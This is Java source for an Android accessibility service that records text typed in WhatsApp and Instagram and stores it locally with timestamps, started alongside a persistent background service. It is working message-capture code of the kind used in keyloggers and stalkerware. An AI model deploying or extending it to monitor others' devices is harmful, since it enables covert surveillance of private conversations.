package com.pritamdey.contentcopy;

import static android.content.ContentValues.TAG;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.google.gson.Gson;

import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    private SharedPreferences sharedPreferences;
    private SharedPreferences.Editor editor;
    private List<String> appsList;

    @Override
    public void onCreate() {
        super.onCreate();
        appsList = new ArrayList<>();
        appsList.add("com.whatsapp");
        appsList.add("com.instagram.android");
        startService(new Intent(this, MyStickyService.class));
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String packageName = String.valueOf(event.getPackageName());

        if (appsList.contains(packageName)) {
            AccessibilityNodeInfo nodeInfo = event.getSource();
            String text = String.valueOf(nodeInfo.getText());
            String appName = getCategoryFromPackageName(packageName);

            createSharedPreferences(appName, text);
        }


    }

    private void createSharedPreferences(String appName, String text) {
        sharedPreferences = getApplicationContext().getSharedPreferences("Text_Preferences", MODE_PRIVATE);
        editor = sharedPreferences.edit();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Gson gson = new Gson();
            String textJson = gson.toJson(new Text(text, appName));
            editor.putString("message" + LocalDateTime.now(), textJson);
        }
        editor.apply();
    }

    private String getCategoryFromPackageName(String packageName) {

        PackageManager packageManager = getPackageManager();
        ApplicationInfo appInfo;
        try {
            appInfo = packageManager.getApplicationInfo(packageName, PackageManager.GET_META_DATA);
        } catch (PackageManager.NameNotFoundException e) {
            return "Unknown";
        }
        return (String) appInfo.loadLabel(packageManager);

    }


    @Override
    public void onInterrupt() {

    }
}
